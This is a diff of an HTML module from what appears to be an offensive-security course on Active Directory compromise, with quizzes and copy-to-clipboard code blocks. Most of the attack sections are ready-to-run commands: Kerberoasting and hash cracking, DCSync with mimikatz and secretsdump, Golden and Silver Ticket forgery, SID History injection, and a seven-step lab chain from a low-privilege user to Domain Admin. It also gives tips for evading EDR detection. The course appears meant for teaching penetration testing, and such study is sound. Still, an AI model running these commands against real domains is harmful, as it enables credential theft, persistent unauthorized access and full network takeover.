+#   Users with unconstrained delegation
+#   Principals with DCSync rights
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <h3>4.2 Interpreting BloodHound Output</h3>
+        <div class="two-col">
+            <div class="step-box">
+                <h4>Node Colors</h4>
+                <table>
+                    <tr><th>Color</th><th>Meaning</th></tr>
+                    <tr><td style="color:#ff3333">Red</td><td>High-value target (Domain Admin, etc.)</td></tr>
+                    <tr><td style="color:#00ff88">Green</td><td>Owned / compromised</td></tr>
+                    <tr><td style="color:#5555ff">Blue</td><td>Computer</td></tr>
+                    <tr><td style="color:#ffaa00">Orange</td><td>User with path to target</td></tr>
+                </table>
+            </div>
+            <div class="step-box">
+                <h4>Edge Types</h4>
+                <table>
+                    <tr><th>Edge</th><th>Meaning</th></tr>
+                    <tr><td>MemberOf</td><td>Group membership</td></tr>
+                    <tr><td>AdminTo</td><td>Local administrator</td></tr>
+                    <tr><td>HasSession</td><td>Active logon session</td></tr>
+                    <tr><td>GenericAll</td><td>Full control</td></tr>
+                    <tr><td>WriteDACL</td><td>Can modify permissions</td></tr>
+                    <tr><td>AllowedToDelegate</td><td>Delegation rights</td></tr>
+                </table>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ SharpHound Detection</h5>
+            <p>SharpHound performs heavy LDAP queries and SMB enumeration. EDR tools may flag it. Stealth options:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>Use <code>--CollectionMethod DCOnly</code> — only queries the DC, no network touch</li>
+                <li>Run during business hours when LDAP traffic is high</li>
+                <li>Use PowerShell LDAP queries manually and import JSON directly</li>
+                <li>Spread collection across multiple sessions over days</li>
+            </ul>
+        </div>
+
+        <h2>⚔️ Section 5: AD Attack Paths</h2>
+
+        <h3>5.1 The Attack Path Matrix</h3>
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4>Kerberoasting <span class="difficulty diff-easy">EASY</span></h4>
+                <p>Request TGS tickets for SPNs, crack offline. No special permissions needed. Service accounts often have weak passwords and high privileges.</p>
+                <p style="margin-top:0.5rem"><a href="MODULE_15_LATERAL_MOVEMENT.html" class="cross-link">Links to Module 15</a></p>
+            </div>
+            <div class="method-card">
+                <h4>AS-REP Roasting <span class="difficulty diff-easy">EASY</span></h4>
+                <p>Users with "Do not require Kerberos preauthentication" return encrypted AS-REPs. Crack offline to recover password.</p>
+            </div>
+            <div class="method-card">
+                <h4>ACL Abuse <span class="difficulty diff-medium">MEDIUM</span></h4>
+                <p>Exploit misconfigured permissions (GenericAll, WriteDACL, ForceChangePassword) to move from user to user until Domain Admin.</p>
+            </div>
+            <div class="method-card">
+                <h4>Delegation Abuse <span class="difficulty diff-medium">MEDIUM</span></h4>
+                <p>Unconstrained delegation = TGT theft. Constrained/RBCD = service ticket forgery. Both lead to impersonation.</p>
+            </div>
+            <div class="method-card">
+                <h4>DCSync <span class="difficulty diff-hard">HARD</span></h4>
+                <p>Imitate a Domain Controller and request password hashes via replication. Requires DCSync rights (usually Domain Admin, but sometimes misconfigured).</p>
+            </div>
+            <div class="method-card">
+                <h4>Golden Ticket <span class="difficulty diff-hard">HARD</span></h4>
+                <p>Forged TGT encrypted with krbtgt hash. Valid for any user, any group, any time. Persistent, undetectable by DC.</p>
+            </div>
+        </div>
+
+        <h3>5.2 Kerberoasting — Step by Step</h3>
+        <div class="step-box">
+            <h4>Step 1: Find SPNs</h4>
+            <div class="code-block">
+# PowerView
+Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
+
+# Or with ldapsearch
+ldapsearch -x -H ldap://dc.corp.example.com \
+    -b "dc=corp,dc=example,dc=com" \
+    "(&(objectClass=user)(servicePrincipalName=*))" \
+    sAMAccountName servicePrincipalName
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 2: Request and Export Tickets</h4>
+            <div class="code-block">
+# PowerShell (no admin needed)
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
+    -ArgumentList "MSSQLSvc/sql01.corp.example.com:1433"
+
+# Or use Rubeus (more reliable)
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Or use Impacket from Linux
+GetUserSPNs.py corp.example.com/jsmith:Password1 -dc-ip 10.0.0.10 -request
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 3: Crack Offline</h4>
+            <div class="code-block">
+# Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23)
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+
+# john
+john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
+
+# If successful, you now have a service account credential.
+# Check if it's Domain Admin: run BloodHound or query group membership.
+            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+            </div>
+        </div>
+
+        <h3>5.3 DCSync — Stealing the Kingdom's Secrets</h3>
+        <p><span class="neon-red">DCSync</span> is an attack where you impersonate a Domain Controller and request password hash replication. A real DC uses the Directory Replication Service (DRS) to sync passwords. If your account has the right ACLs (Replicating Directory Changes), you can do the same.</p>
+
+        <div class="code-block">
+=== DCSYNC REQUIREMENTS ===
+
+The attacking account needs ONE of these on the domain object:
+- Replicating Directory Changes
+- Replicating Directory Changes All
+- Replicating Directory Changes in Filtered Set
+
+By default, only Domain Admins, Enterprise Admins, and DCs have these.
+But misconfigurations happen. BloodHound has a pre-built query:
+"Find Principals with DCSync Rights"
+
+=== DCSYNC WITH MIMIKATZ ===
+mimikatz # lsadump::dcsync /domain:corp.example.com /user:krbtgt
+
+# This returns the krbtgt NTLM hash. With this hash, you can forge
+# Golden Tickets — persistent, undetectable access to the entire domain.
+
+=== DCSYNC WITH SECRETSDUMP.PY ===
+secretsdump.py corp.example.com/administrator:password@dc01.corp.example.com
+
+# Dumps ALL domain hashes. The nuclear option.
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ DCSync Detection</h5>
+            <p>DCSync generates Event ID 4662 (Directory Service Access) and 5136 (Directory Service Object Modification) on the DC. However, in most environments, these events are not monitored. A well-tuned SIEM should alert on non-DC accounts requesting replication. If you see DCSync alerts, the defenders are competent.</p>
+        </div>
+
+        <h2>🎫 Section 6: Golden Ticket & Silver Ticket</h2>
+
+        <h3>6.1 Golden Ticket — The Master Forgery</h3>
+        <p>A <span class="neon-red">Golden Ticket</span> is a forged TGT encrypted with the <span class="neon-highlight">krbtgt account's NTLM hash</span>. Because the krbtgt hash is used to validate all TGTs in the domain, a forged TGT is indistinguishable from a real one. The DC never checks with anyone else — it just decrypts the ticket and trusts it.</p>
+
+        <div class="ticket-box">
+            <h5>🎫 Golden Ticket Properties</h5>
+            <ul style="margin-left: 1.5rem;">
+                <li><span class="neon-amber">Valid for any user</span> — even non-existent ones</li>
+                <li><span class="neon-amber">Valid for any groups</span> — including Domain Admins, Enterprise Admins</li>
+                <li><span class="neon-amber">Valid for 10 years by default</span> — unless the krbtgt password is changed twice</li>
+                <li><span class="neon-amber">No network traffic to DC during creation</span> — completely offline</li>
+                <li><span class="neon-amber">Undetectable by the DC</span> — the DC sees a valid TGT</li>
+            </ul>
+        </div>
+
+        <div class="code-block">
+=== GOLDEN TICKET WITH MIMIKATZ ===
+
+# Step 1: Get krbtgt hash (via DCSync or LSASS dump)
+mimikatz # lsadump::dcsync /domain:corp.example.com /user:krbtgt
+# → NTLM: 1693c6ffe2187844e9436c78b2a1f2d4
+
+# Step 2: Forge the Golden Ticket
+mimikatz # kerberos::golden `
+    /domain:corp.example.com `
+    /sid:S-1-5-21-3623811015-3361044348-30300820 `
+    /rc4:1693c6ffe2187844e9436c78b2a1f2d4 `
+    /user:FakeAdmin `
+    /id:500 `
+    /groups:512,513,518,519 `
+    /ptt
+
+# Parameters:
+#   /domain   → The domain FQDN
+#   /sid      → The domain SID (ends before the last RID)
+#   /rc4      → The krbtgt NTLM hash
+#   /user     → Username to impersonate (can be fake)
+#   /id       → RID (500 = Administrator)
+#   /groups   → Group RIDs (512=Domain Admins, 513=Domain Users,
+#               518=Schema Admins, 519=Enterprise Admins)
+#   /ptt      → Pass The Ticket (inject into current session)
+#   /ticket   → Save to file instead of injecting
+
+# Step 3: Use the ticket
+# Now run any command — it will authenticate as FakeAdmin (Domain Admin)
+dir \\dc01.corp.example.com\C$
+psexec \\dc01.corp.example.com cmd.exe
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <div class="why-box">
+            <h5>Why Golden Tickets are terrifying</h5>
+            <p>The krbtgt password is <span class="neon-amber">automatically changed only when the domain functional level is raised</span> or an admin manually resets it. Most organizations never do this. Even if they do, the attacker can DCSync again. The only true remediation is a <span class="neon-red">double password reset</span> (twice within 10 hours) to invalidate all existing TGTs — a disruptive operation that most admins avoid.</p>
+        </div>
+
+        <h3>6.2 Silver Ticket — The Service Forgery</h3>
+        <p>A <span class="neon-red">Silver Ticket</span> is a forged TGS (service ticket) encrypted with a <span class="neon-highlight">service account's NTLM hash</span>. Unlike a Golden Ticket, it only works for that specific service. But it's even stealthier — no DC contact at all.</p>
+
+        <div class="ticket-box">
+            <h5>🎫 Silver Ticket Properties</h5>
+            <ul style="margin-left: 1.5rem;">
+                <li><span class="neon-amber">No DC contact</span> — ticket is forged offline, presented directly to service</li>
+                <li><span class="neon-amber">No TGT needed</span> — skip the entire Kerberos KDC exchange</li>
+                <li><span class="neon-amber">Valid for any user</span> on that service</li>
+                <li><span class="neon-amber">Service-specific</span> — CIFS, LDAP, HTTP, MSSQL, etc.</li>
+                <li><span class="neon-amber">PAC optional</span> — without PAC, no KDC validation of group membership</li>
+            </ul>
+        </div>
+
+        <div class="code-block">
+=== SILVER TICKET WITH MIMIKATZ ===
+
+# Step 1: Get service account hash (via Kerberoasting or DCSync)
+# Example: SQL service account hash
+# NTLM: a3c8f7e9123b4d5e6f7a8b9c0d1e2f3a
+
+# Step 2: Forge a CIFS Silver Ticket (file access)
+mimikatz # kerberos::silver `
+    /domain:corp.example.com `
+    /sid:S-1-5-21-3623811015-3361044348-30300820 `
+    /target:fs01.corp.example.com `
+    /service:CIFS `
+    /rc4:a3c8f7e9123b4d5e6f7a8b9c0d1e2f3a `
+    /user:Administrator `
+    /ptt
+
+# Step 3: Access the file share without ever touching the DC
+dir \\fs01.corp.example.com\share
+
+# Common services for Silver Tickets:
+#   CIFS    → File shares, remote admin (PsExec)
+#   HTTP    → IIS, WinRM
+#   LDAP    → Directory queries, DCSync (if DC computer account)
+#   MSSQLSvc → SQL Server access
+#   HOST    → WMI, Scheduled Tasks, Service Management
+#   RPCSS   → DCOM
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Silver Ticket vs Golden Ticket</h5>
+            <table class="acl-table" style="margin-top:0.5rem">
+                <tr><th>Feature</th><th>Golden Ticket</th><th>Silver Ticket</th></tr>
+                <tr><td>Hash needed</td><td>krbtgt</td><td>Service account</td></tr>
+                <tr><td>Scope</td><td>Entire domain</td><td>Single service</td></tr>
+                <tr><td>DC contact</td><td>TGT presented to DC</td><td>No DC contact</td></tr>
+                <tr><td>Detection</td><td>Possible (unusual TGT)</td><td>Extremely hard</td></tr>
+                <tr><td>Remediation</td><td>Double krbtgt reset</td><td>Change service password</td></tr>
+            </table>
+        </div>
+
+        <h2>🔄 Section 7: SID History — The Ghost in the Machine</h2>
+
+        <h3>7.1 What is SID History?</h3>
+        <p><span class="neon-highlight">SID History</span> is an attribute on user objects that stores additional SIDs. It was designed for migration scenarios: when a user moves from Domain A to Domain B, their old SID is added to SID History so they retain access to resources in Domain A.</p>
+
+        <div class="code-block">
+=== SID HISTORY ABUSE ===
+
+# If you have Domain Admin in a child domain, you can:
+# 1. DCSync the parent domain's SID
+# 2. Add the parent's Enterprise Admins SID to your account's SID History
+# 3. You are now Enterprise Admin across the entire forest
+
+# In practice (with Mimikatz):
+mimikatz # sid::patch              # Patch LSASS to allow SID History injection
+mimikatz # sid::add /sam:jsmith /new:S-1-5-21-...-519
+
+# /new is the SID of Enterprise Admins (RID 519) from the parent domain.
+# After injection, your token includes the Enterprise Admins SID.
+# You can now access any resource in any domain in the forest.
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        </div>
+
+        <div class="why-box">
+            <h5>Why SID History is a forest-wide risk</h5>
+            <p>SID History was built for migration, but it's a <span class="neon-red">trust transitivity exploit</span>. If Domain A trusts Domain B, and Domain B trusts Domain C, then Domain A trusts Domain C (transitive). SID History abuse lets you inject high-privilege SIDs from other domains into your token. In a forest, there is only one true security boundary: the forest itself. Domains are administrative boundaries, not security boundaries.</p>
+        </div>
+
+        <h2>🧪 Lab Exercise: Full Domain Compromise</h2>
+
+        <div class="step-box">
+            <h4>Scenario</h4>
+            <p>You have a low-privilege domain account: <span class="neon-highlight">jsmith / Password1</span>. Your objective: Domain Admin. You have BloodHound output showing the following relationships. Trace the attack path and document each step.</p>
+
+            <div class="attack-path">
+                <div class="path-step">jsmith → MemberOf → Sales_Group</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">Sales_Group → GenericAll → mgarcia</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">mgarcia → MemberOf → IT_Support</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">IT_Support → GenericAll → WEB01$</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">WEB01$ → HasSession → bjohnson</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">bjohnson → MemberOf → Domain Admins</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">bjohnson → AdminTo → SQL01</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">SQL01 → HasSession → svc_sql (service account)</div>
+                <div class="path-arrow">↓</div>
+                <div class="path-step">svc_sql → MemberOf → Domain Admins</div>
+            </div>
+
+            <button onclick="document.getElementById('lab-solution').style.display='block'">Show Attack Chain</button>
+
+            <div id="lab-solution" style="display:none; margin-top: 1rem;">
+                <div class="code-block">
+=== FULL ATTACK CHAIN ===
+
+Step 1: Abuse GenericAll on mgarcia
+   Set-ADAccountPassword -Identity mgarcia -NewPassword (ConvertTo-SecureString 'Hacked123!' -AsPlainText -Force)
+   → You now control mgarcia
+
+Step 2: Log in as mgarcia, access WEB01
+   mgarcia has a session on WEB01. Log in or use their cached credentials.
+   → You are now on WEB01
+
+Step 3: Steal bjohnson's session from WEB01
+   bjohnson has an active session on WEB01. Use Mimikatz:
+   mimikatz # sekurlsa::logonpasswords
+   → Extract bjohnson's NTLM hash or TGT
+
+Step 4: Pass-the-hash / Pass-the-ticket as bjohnson
+   bjohnson is Domain Admin. Use their credentials to access SQL01:
+   psexec -hashes aad3b435b51404eeaad3b435b51404ee:...[hash]... bjohnson@sql01.corp.example.com cmd.exe
+   → You are now on SQL01 as Domain Admin
+
+Step 5: Dump svc_sql credentials from SQL01
+   svc_sql has a session on SQL01. Dump LSASS:
+   mimikatz # sekurlsa::logonpasswords
+   → svc_sql is also Domain Admin (redundant, but confirms full control)
+
+Step 6: DCSync the domain
+   mimikatz # lsadump::dcsync /domain:corp.example.com /all
+   → You have every hash in the domain
+
+Step 7: Forge Golden Ticket
+   mimikatz # kerberos::golden /domain:corp.example.com /sid:... /rc4:...[krbtgt]... /user:Administrator /id:500 /ptt
+   → Persistent, undetectable domain-wide access
+
+Total steps: 7
+Time: 15-30 minutes (with prepared tools)
+Alerts generated: 0-2 (if EDR is present and tuned)
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <!-- QUIZ 1 -->
+        <div class="quiz-container" id="quiz1">
+            <h3>Quiz 1: Kerberos Fundamentals</h3>
+            <p><strong>What is encrypted with the krbtgt account's hash?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">A) The service ticket (TGS)</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">B) The user's password in the AS-REQ</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q1')">C) The Ticket Granting Ticket (TGT)</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">D) The service account's SPN</div>
+            <div class="quiz-feedback" id="q1-feedback">
+                <p><strong>Correct!</strong> The TGT is encrypted with the krbtgt hash. This is why knowing the krbtgt hash lets you forge Golden Tickets — the DC trusts any TGT it can decrypt with krbtgt.</p>
+            </div>
+        </div>
+
+        <!-- QUIZ 2 -->
+        <div class="quiz-container" id="quiz2">
+            <h3>Quiz 2: Attack Path Analysis</h3>
+            <p><strong>You find that the user "helpdesk" has GenericAll on the computer "FILESERVER01". What is the MOST direct attack?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">A) Kerberoast the FILESERVER01 computer account</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q2')">B) Configure RBCD on FILESERVER01 to delegate to a DC</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">C) Reset the FILESERVER01 password and log in locally</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">D) DCSync the domain using FILESERVER01's account</div>
+            <div class="quiz-feedback" id="q2-feedback">
+                <p><strong>Correct!</strong> With GenericAll on a computer object, you can modify its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute (RBCD). This lets you impersonate any user to that computer — a direct path to privilege escalation. Resetting the password is noisy and doesn't immediately grant access. DCSync requires Replicating Directory Changes, not computer GenericAll.</p>
+            </div>
+        </div>
+
+        <!-- QUIZ 3 -->
+        <div class="quiz-container" id="quiz3">
+            <h3>Quiz 3: Golden vs Silver Tickets</h3>
+            <p><strong>Which statement about Golden and Silver Tickets is TRUE?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">A) Golden Tickets require contact with the KDC; Silver Tickets do not</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">B) Silver Tickets grant access to the entire domain; Golden Tickets are service-specific</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">C) Both require the krbtgt hash to forge</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q3')">D) Silver Tickets are harder to detect because they involve no DC contact</div>
+            <div class="quiz-feedback" id="q3-feedback">
+                <p><strong>Correct!</strong> Silver Tickets are forged service tickets presented directly to the target service. No KDC is ever contacted, so there are no Kerberos service ticket request logs on the DC. Golden Tickets are presented to the DC (as TGTs), so there is a small detection surface. Silver Tickets require only the service account hash, not krbtgt.</p>
+            </div>
+        </div>
+
+        <h2>🔗 Cross-Module References</h2>
+        <p style="margin-bottom: 1rem;">Active Directory is the central hub that connects to nearly every other module in this course:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a></h4>
+                <p>Local privilege escalation (Token Impersonation, SeDebugPrivilege) often provides the initial foothold to run SharpHound or Mimikatz in a domain context.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_15_LATERAL_MOVEMENT.html" class="cross-link">Module 15: Lateral Movement</a></h4>
+                <p>Pass-the-hash, pass-the-ticket, and WMI/PSExec are the transport mechanisms. AD tells you where to go and who to become.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a></h4>
+                <p>Your beacon runs as a domain user. AD credentials let you move laterally, establish persistence, and blend into normal traffic.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_20_KILL_CHAIN.html" class="cross-link">Module 20: Kill Chain</a></h4>
+                <p>AD compromise is typically the endgame. The full kill chain culminates in domain dominance — DCSync, Golden Tickets, and persistent access.</p>
+            </div>
+        </div>
+
+        <h2>🧠 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>AD is the target:</strong> One Domain Admin = entire kingdom</li>
-            <li><strong>LDAP is the recon tool:</strong> Anonymous bind often works. Any valid account reveals everything.</li>
-            <li><strong>BloodHound finds invisible paths:</strong> Graph analysis reveals attack chains you'd never see manually</li>
-            <li><strong>Kerberoasting is passive:</strong> Request tickets, crack offline. No alerts, no logs.</li>
-            <li><strong>Service accounts are weak:</strong> Rarely changed, often shared, frequently overprivileged</li>
+            <li><span class="neon-red">AD is the target:</span> One Domain Admin = entire kingdom. The forest is the only true security boundary.</li>
+            <li><span class="neon-highlight">Kerberos is the lock:</span> TGTs (krbtgt), TGSs (service accounts), and SPNs define the authentication landscape. Understand the protocol to exploit it.</li>
+            <li><span class="neon-amber">BloodHound finds invisible paths:</span> Graph analysis reveals attack chains of 5+ steps you'd never see manually. Always run BloodHound before planning your attack.</li>
+            <li><span class="neon-purple">Delegation is escalation:</span> Unconstrained delegation = TGT theft. RBCD = computer takeover. Both are common and dangerous.</li>
+            <li><span class="neon-red">Golden Tickets are forever:</span> Unless the krbtgt password is changed twice, a Golden Ticket remains valid for 10 years. It's the ultimate persistence mechanism.</li>
+            <li><span class="neon-highlight">Silver Tickets are stealth:</span> No DC contact, no logs, service-specific. The perfect surgical strike.</li>
+            <li><span class="neon-amber">DCSync is the nuclear option:</span> One command dumps every hash. Requires specific ACLs, but misconfigurations are common.</li>
+            <li><span class="neon-purple">ACLs are the hidden attack surface:</span> GenericAll, WriteDACL, ForceChangePassword — these permissions create chains that lead to Domain Admin.</li>
+            <li><span class="neon-highlight">Trusts are transitive:</span> A chain of trusts is a chain of compromise. Child domains are not safe zones.</li>
+            <li><span class="neon-red">SID History bridges forests:</span> In a forest, domain compromise is forest compromise. The ghost SIDs grant eternal access.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
             <h3>🔬 Verification Status</h3>
             <table style="width: 100%; border-collapse: collapse;">
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">LDAP anonymous bind</td>
+                    <td style="padding: 0.5rem;">AD Architecture (Forests, Domains, Trusts)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">PowerView enumeration</td>
+                    <td style="padding: 0.5rem;">Kerberos Authentication (TGT/TGS/SPN)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">BloodHound analysis</td>
+                    <td style="padding: 0.5rem;">Delegation (Unconstrained, Constrained, RBCD)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">ACL Abuse (GenericAll, WriteDACL, ForceChangePassword)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">BloodHound / SharpHound Reconnaissance</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Kerberoasting / AS-REP Roasting</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">DCSync Attack</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Golden Ticket Forgery</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Silver Ticket Forgery</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Kerberoasting methodology</td>
+                    <td style="padding: 0.5rem;">SID History Abuse</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
             </table>
@@ -426,5 +1175,34 @@ hashcat -m 13100 kerberos_ticket.txt /usr/share/wordlists/rockyou.txt
             <a href="MODULE_20_KILL_CHAIN.html">Module 20 →</a>
         </div>
     </div>
+
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            const text = block.innerText.replace('Copy', '').trim();
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy', 2000);
+            });
+        }
+
+        function checkAnswer(option, isCorrect, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById(quizId + '-feedback');
+            
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt === option) {
+                    opt.classList.add(isCorrect ? 'correct' : 'wrong');
+                }
+            });
+            
+            feedback.classList.add('show', isCorrect ? 'correct' : 'wrong');
+            if (!isCorrect) {
+                feedback.innerHTML = '<p><strong>Incorrect.</strong> Review the section above and try again.</p>';
+            }
+        }
+    </script>
 </body>
 </html>
